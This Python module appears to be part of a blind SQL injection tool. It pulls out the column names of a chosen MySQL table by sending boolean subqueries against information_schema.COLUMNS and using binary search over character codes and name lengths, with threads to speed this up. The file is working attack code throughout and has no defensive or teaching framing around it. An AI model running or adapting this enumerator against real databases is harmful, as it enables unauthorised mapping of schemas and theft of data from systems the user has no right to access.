import threading
import core

core.read_cache()

class Column:
    def __init__(self, name):
        self.name = name

    def set_type(self, type):
        self.type = type

class ColumnCharacterTester(threading.Thread):
    def __init__(self, database, table, position, index):
        super(ColumnCharacterTester, self).__init__()
        self.database = database
        self.table = table
        self.position = position
        self.index = index
        self.character = -1

    def run(self):
        self.character = self.get_char()
        while self.character == -1:
            self.get_char()

    def test_character(self, character, position, operation=">="):
        injection_string = "(SELECT count(*) FROM (SELECT TABLE_SCHEMA,TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=%s and TABLE_NAME=%s ORDER BY ORDINAL_POSITION LIMIT %d,1) " \
                           "as temp where ASCII(SUBSTRING(COLUMN_NAME, %d, 1))%s%d)" % \
                           (core.char_array(self.database), core.char_array(self.table), self.index - 1, position, operation, character)
        return core.check_truth(injection_string)

    def get_char(self):
        min_char = 1
        max_char = 128
        character = (min_char + max_char) / 2

        while True:
            length_check = self.test_character(character, self.position)
            core.println("Checked column character %d for index %d for position %d: %s" % (character, self.index, self.position, length_check))
            if length_check:
                min_char = character
            else:
                max_char = character - 1

            if min_char == max_char or max_char - min_char == 1:
                min_length_check = self.test_character(min_char, self.position, "=")
                if min_length_check:
                    core.println("Found column character %d for index %d for position %d" % (min_char, self.index, self.position))
                    return min_char
                max_length_check = self.test_character(max_char, self.position, "=")
                if max_length_check:
                    core.println("Found column character %d for index %d for position %d" % (max_char, self.index, self.position))
                    return max_char
                return -1

            character = (min_char + max_char) / 2

        return -1


class ColumnBruteForcer(threading.Thread):
    def __init__(self, database, table, index):
        super(ColumnBruteForcer, self).__init__()
        self.database = database
        self.table = table
        self.character_count = -1
        self.found_characters = ""
        self.index = index

    def get_name(self):
        return self.found_characters

    def run(self):
        self.get_characters()

    def get_characters(self):
        self.found_characters = ""
        self.character_count = self.get_length()

        for j in range((self.character_count // 10) + 1):
            column_character_testers = []
            for i in range(j * 10, (j + 1) * 10):
                if i < self.character_count:
                    column_character_tester = ColumnCharacterTester(self.database, self.table, i + 1, self.index)
                    column_character_tester.start()
                    column_character_testers.append(column_character_tester)

            for column_character_tester in column_character_testers:
                column_character_tester.join()
                self.found_characters += chr(column_character_tester.character)

        core.println("Found column name at index %d is %s" % (self.index, self.found_characters))

    def check_count(self, count, operation = ">="):
        injection_string = "(SELECT count(*) FROM (SELECT TABLE_SCHEMA,TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=%s and TABLE_NAME=%s ORDER BY ORDINAL_POSITION LIMIT %d,1) " \
                           "as temp where length(COLUMN_NAME)%s%d)" %\
                           (core.char_array(self.database), core.char_array(self.table), self.index - 1, operation, count)
        return core.check_truth(injection_string)


    def get_length(self):
        min_count = 1
        max_count = 64

        count = (min_count + max_count) / 2

        while True:
            count_check = self.check_count(count)
            core.println("Checked column length for index %d count %d: %s" % (self.index, count, count_check))
            if count_check:
                min_count = count
            else:
                max_count = count - 1

            if min_count == max_count or max_count - min_count == 1:
                min_count_check = self.check_count(min_count, "=")
                if min_count_check:
                    core.println("Found column length for index %d count %d" % (self.index, min_count))
                    return min_count
                max_count_check = self.check_count(max_count, "=")
                if max_count_check:
                    core.println("Found column length for index %d count %d" % (self.index, max_count))
                    return max_count
                break

            count = (min_count + max_count) / 2
        return -1

class ColumnDetector:
    def __init__(self, database, table):
        self.database = database
        self.table = table
        self.columns = []

    def start(self):
        pass

    def check_count(self, count, operation = ">="):
        injection_string = "(SELECT count(*) from information_schema.COLUMNS where TABLE_SCHEMA=%s and TABLE_NAME=%s)%s%d" %\
                           (core.char_array(self.database), core.char_array(self.table), operation, count)
        return core.check_truth(injection_string)

    def get_count(self):
        min_count = 1
        max_count = 1024

        count = (min_count + max_count) / 2

        while True:
            count_check = self.check_count(count)
            core.println("Checked count %d: %s" % (count, count_check))
            if count_check:
                min_count = count
            else:
                max_count = count - 1

            if min_count == max_count or max_count - min_count == 1:
                min_count_check = self.check_count(min_count, "=")
                if min_count_check:
                    core.println("Found count %d" % min_count)
                    return min_count
                max_count_check = self.check_count(max_count, "=")
                if max_count_check:
                    core.println("Found count %d" % max_count)
                    return max_count
                break

            count = (min_count + max_count) / 2
        return -1

    def get_columns(self):
        column_count = self.get_count()
        core.println("Found %d columns\n" % column_count)

        column_brute_forcers = []
        for i in range(column_count):
            column_brute_forcer = ColumnBruteForcer(self.database, self.table, i + 1)
            column_brute_forcer.start()
            column_brute_forcer.join()
            column_brute_forcers.append(column_brute_forcer)

        self.columns = []

        for column_brute_forcer in column_brute_forcers:
            # column_brute_forcer.join()
            core.println("Found column: %s" % column_brute_forcer.get_name())
            self.columns.append(Column(column_brute_forcer.get_name()))

if __name__ == '__main__':
    database = ""
    table = ""
    core.read_cache()
    column_detector = ColumnDetector(database, table)
    column_detector.get_columns()